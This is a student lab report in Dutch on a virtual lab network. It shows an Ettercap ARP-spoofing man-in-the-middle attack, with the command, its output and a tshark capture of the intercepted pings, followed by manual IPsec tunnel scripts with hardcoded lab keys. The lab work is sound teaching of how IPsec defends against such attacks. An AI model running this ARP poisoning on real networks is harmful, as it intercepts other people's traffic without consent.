# Lab10 - IPsec

## RemoteClient

```bash
cyb@remoteclient:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:cb:39:8e brd ff:ff:ff:ff:ff:ff
    inet 172.123.0.10/24 metric 100 brd 172.123.0.255 scope global dynamic enp0s3
       valid_lft 324sec preferred_lft 324sec
    inet6 fe80::a00:27ff:fecb:398e/64 scope link
       valid_lft forever preferred_lft forever
cyb@remoteclient:~$ ip route
default via 172.123.0.254 dev enp0s3
172.123.0.0/24 dev enp0s3 proto kernel scope link src 172.123.0.10 metric 100
cyb@remoteclient:~$
```

## MiTM Attack

`red`:

```bash
sudo apt-get update
sudo apt-get install ettercap-text-only -y
```

### Uitvoering

Start de ARP-spoofing aanval met Ettercap om verkeer tussen remoterouter en companyrouter te onderscheppen:

```bash
sudo ettercap -Tq -i enp0s3 -M arp:remote /192.168.100.103// /192.168.100.253//
```

- Interface (<interface>): `enp0s3`: De netwerkinterface op red.
- Left IP (<leftIP>): `192.168.100.103`: IP-adres van remoteclient.
- Right IP (<rightIP>): `192.168.100.253`: IP-adres van remoterouter.

### Resultaat

Op red machine staat ettercap aan:

```bash
red@machine:~$ sudo ettercap -Tq -i enp0s3 -M arp:remote /192.168.100.103// /192.168.100.253//
[sudo] password for red:

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
enp0s3 -> 08:00:27:08:A7:B0
          192.168.100.102/255.255.255.0
          fe80::a00:27ff:fe08:a7b0/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/enp0s3/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

3 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.100.103 08:00:27:B4:EA:5E

 GROUP 2 : 192.168.100.253 08:00:27:68:98:B2
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

```

Op remoteclient heb ik een traceroute en een ping gedaan:

```bash
cyb@remoteclient:~$ traceroute 172.30.0.5
traceroute to 172.30.0.5 (172.30.0.5), 30 hops max, 60 byte packets
 1  254.0.123.172.rev.iijmobile.jp (172.123.0.254)  0.307 ms  0.274 ms  0.263 ms
 2  192.168.100.254 (192.168.100.254)  3.817 ms  3.807 ms  3.796 ms
 3  192.168.100.253 (192.168.100.253)  11.634 ms  11.550 ms  11.477 ms
 4  172.30.0.5 (172.30.0.5)  11.595 ms  11.653 ms  11.730 ms
cyb@remoteclient:~$ ping 172.30.0.4
PING 172.30.0.4 (172.30.0.4) 56(84) bytes of data.
64 bytes from 172.30.0.4: icmp_seq=1 ttl=126 time=14.3 ms
64 bytes from 172.30.0.4: icmp_seq=2 ttl=126 time=12.8 ms
64 bytes from 172.30.0.4: icmp_seq=3 ttl=126 time=11.4 ms
^C
--- 172.30.0.4 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 11.394/12.837/14.298/1.185 ms
```

Op een nieuwe terminal wordt dit onderschept met wireshark:

```bash
red@machine:~$ sudo tshark -i enp0s3 icmp
Running as user "root" and group "root". This could be dangerous.
Capturing on 'enp0s3'
 ** (tshark:1649) 12:03:29.209610 [Main MESSAGE] -- Capture started.
 ** (tshark:1649) 12:03:29.209825 [Main MESSAGE] -- File: "/tmp/wireshark_enp0s30L1GS2.pcapng"
    1 0.000000000 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
    2 0.000000092 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
    3 0.000137344 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
    4 0.000488533   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
    5 0.000817525   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
    6 0.000996997   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
    7 0.001087614   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
    8 0.001087730   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
    9 0.001412777   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   10 0.007451672 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
   11 0.007489645 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
   12 0.007512763 192.168.100.253 → 192.168.100.103 ICMP 102 Time-to-live exceeded (Time to live exceeded in transit)
   13 0.007603153   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   14 0.007771629   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   15 0.007902089   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   16 0.007977125   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   17 0.008044183   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   18 0.008236113   172.30.0.5 → 192.168.100.103 ICMP 102 Destination unreachable (Port unreachable)
   19 7.570049065 192.168.100.253 → 192.168.100.102 ICMP 102 Destination unreachable (Host unreachable)
   20 7.570049623 192.168.100.253 → 192.168.100.102 ICMP 102 Destination unreachable (Host unreachable)
   21 7.570049671 192.168.100.253 → 192.168.100.102 ICMP 102 Destination unreachable (Host unreachable)
   22 8.941825883 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=1/256, ttl=63
   23 8.947372558 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=1/256, ttl=63
   24 8.948371008   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=1/256, ttl=127 (request in 23)
   25 8.955382374   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=1/256, ttl=127
   26 9.943444176 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=2/512, ttl=63
   27 9.947381337 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=2/512, ttl=63
   28 9.948257822   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=2/512, ttl=127 (request in 27)
   29 9.955395927   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=2/512, ttl=127
   30 10.944740153 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=3/768, ttl=63
   31 10.947401321 192.168.100.103 → 172.30.0.4   ICMP 98 Echo (ping) request  id=0x000f, seq=3/768, ttl=63
   32 10.948351834   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=3/768, ttl=127 (request in 31)
   33 10.955348791   172.30.0.4 → 192.168.100.103 ICMP 98 Echo (ping) reply    id=0x000f, seq=3/768, ttl=127
^Ctshark:
33 packets captured
```

De ARP-poisoning en Unified Sniffing waren succesvol, zoals blijkt uit de onderschepte ICMP-pakketten op de red machine. Dit bevestigt dat de MiTM-aanval werkt en dat red het verkeer tussen `remoteclient` en `remoterouter` onderschept.

Zie arp table en ip neigh table:

```bash
[cyb@companyrouter ~]$ ip neigh
172.30.0.5 dev eth1 lladdr 08:00:27:85:77:8b STALE
192.168.100.102 dev eth0 lladdr 08:00:27:08:a7:b0 REACHABLE
172.30.0.6 dev eth1 INCOMPLETE
172.30.20.10 dev eth2 lladdr 08:00:27:de:9a:fe REACHABLE
172.30.0.4 dev eth1 lladdr 08:00:27:fe:b6:d7 STALE
192.168.100.1 dev eth0 lladdr 0a:00:27:00:00:11 DELAY
192.168.100.103 dev eth0 lladdr 08:00:27:08:a7:b0 REACHABLE
192.168.100.254 dev eth0 lladdr 08:00:27:2f:42:bc REACHABLE
[cyb@companyrouter ~]$ arp -a
? (172.30.0.5) at 08:00:27:85:77:8b [ether] on eth1
? (192.168.100.102) at 08:00:27:08:a7:b0 [ether] on eth0
? (172.30.0.6) at <incomplete> on eth1
insecure.cyb (172.30.20.10) at 08:00:27:de:9a:fe [ether] on eth2
? (172.30.0.4) at 08:00:27:fe:b6:d7 [ether] on eth1
? (192.168.100.1) at 0a:00:27:00:00:11 [ether] on eth0
? (192.168.100.103) at 08:00:27:08:a7:b0 [ether] on eth0
_gateway (192.168.100.254) at 08:00:27:2f:42:bc [ether] on eth0

cyb@remoterouter:~$ ip neigh
192.168.100.102 dev enp0s3 lladdr 08:00:27:08:a7:b0 STALE
192.168.100.253 dev enp0s3 lladdr 08:00:27:08:a7:b0 REACHABLE
192.168.100.1 dev enp0s3 lladdr 0a:00:27:00:00:11 DELAY
172.123.0.10 dev enp0s8 lladdr 08:00:27:cb:39:8e STALE
192.168.100.254 dev enp0s3 lladdr 08:00:27:2f:42:bc STALE
fe80::dd82:ab73:de07:e77f dev enp0s3 lladdr 0a:00:27:00:00:11 STALE
```

## IPsec

```bash
#!/usr/bin/env sh

# Manual IPSec

## Clean all previous IPsec stuff

ip xfrm policy flush
ip xfrm state flush

## The first SA vars for the tunnel from remoterouter to companyrouter

SPI7=0x007
ENCKEY7=0xFEDCBA9876543210FEDCBA9876543210

## Activate the tunnel from remoterouter to companyrouter

### Define the SA (Security Association)

ip xfrm state add \
    src 192.168.57.103 \
    dst 192.168.57.253 \
    proto esp \
    spi ${SPI7} \
    mode tunnel \
    enc aes ${ENCKEY7}

### Set up the SP using this SA

ip xfrm policy add \
    src 172.123.0.0/24 \
    dst 172.30.0.0/16 \
    dir out \
    tmpl \
    src 192.168.57.103 \
    dst 192.168.57.253 \
    proto esp \
    spi ${SPI7} \
    mode tunnel
```

### Op Remoterouter

```bash
#!/usr/bin/env sh

# Manual IPSec
## Clean all previous IPsec stuff

ip xfrm policy flush
ip xfrm state flush

## The first SA vars for the tunnel from remoterouter to companyrouter

SPI7=0x007
ENCKEY7=0xFEDCBA9876543210FEDCBA9876543210

## The second SA vars for the tunnel from companyrouter to remoterouter

SPI8=0x008
ENCKEY8=0x3e4c71a1b2c394a1d5e6f7c8a9b0c1d2e3f4a5b6c7d8e9f0

## Activate the tunnel from remoterouter to companyrouter
### Define the SA (Security Association)
ip xfrm state add \
   src 192.168.100.103 \
   dst 192.168.100.253 \
   proto esp \
   spi ${SPI7} \
   mode tunnel \
   enc aes ${ENCKEY7}
### Set up the SP using this SA
ip xfrm policy add \
   src 172.123.0.0/24 \
   dst 172.30.0.0/16 \
   dir out \
   tmpl \
   src 192.168.100.103 \
   dst 192.168.100.253 \
   proto esp \
   spi ${SPI7} \
   mode tunnel
## Activate the tunnel from companyrouter to remoterouter
### Define the SA (Security Association)
ip xfrm state add \
   src 192.168.100.253 \
   dst 192.168.100.103 \
   proto esp \
   spi ${SPI8} \
   mode tunnel \
   enc aes ${ENCKEY8}
### Set up the SP using this SA
ip xfrm policy add \
   src 172.30.0.0/16 \
   dst 172.123.0.0/24 \
   dir in \
   tmpl \
   src 192.168.100.253 \
   dst 192.168.100.103 \
   proto esp \
   spi ${SPI8} \
   mode tunnel
```

### Op Companyrouter:

```bash
#!/usr/bin/env sh
# Manual IPSec
## Clean all previous IPsec stuff
ip xfrm policy flush
ip xfrm state flush
## The first SA vars for the tunnel from remoterouter to companyrouter
SPI7=0x007
ENCKEY7=0xFEDCBA9876543210FEDCBA9876543210
## The second SA vars for the tunnel from companyrouter to remoterouter
SPI8=0x008
ENCKEY8=0x3e4c71a1b2c394a1d5e6f7c8a9b0c1d2e3f4a5b6c7d8e9f0
## Activate the tunnel from remoterouter to companyrouter
### Define the SA (Security Association)
ip xfrm state add \
   src 192.168.100.103 \
   dst 192.168.100.253 \
   proto esp \
   spi ${SPI7} \
   mode tunnel \
   enc aes ${ENCKEY7}
### Set up the SP using this SA
ip xfrm policy add \
   src 172.123.0.0/24 \
   dst 172.30.0.0/16 \
   dir in \
   tmpl \
   src 192.168.100.103 \
   dst 192.168.100.253 \
   proto esp \
   spi ${SPI7} \
   mode tunnel
## Activate the tunnel from companyrouter to remoterouter
### Define the SA (Security Association)
ip xfrm state add \
   src 192.168.100.253 \
   dst 192.168.100.103 \
   proto esp \
   spi ${SPI8} \
   mode tunnel \
   enc aes ${ENCKEY8}

### Set up the SP using this SA

ip xfrm policy add \
   src 172.30.0.0/16 \
   dst 172.123.0.0/24 \
   dir out \
   tmpl \
   src 192.168.100.253 \
   dst 192.168.100.103 \
   proto esp \
   spi ${SPI8} \
 mode tunnel
```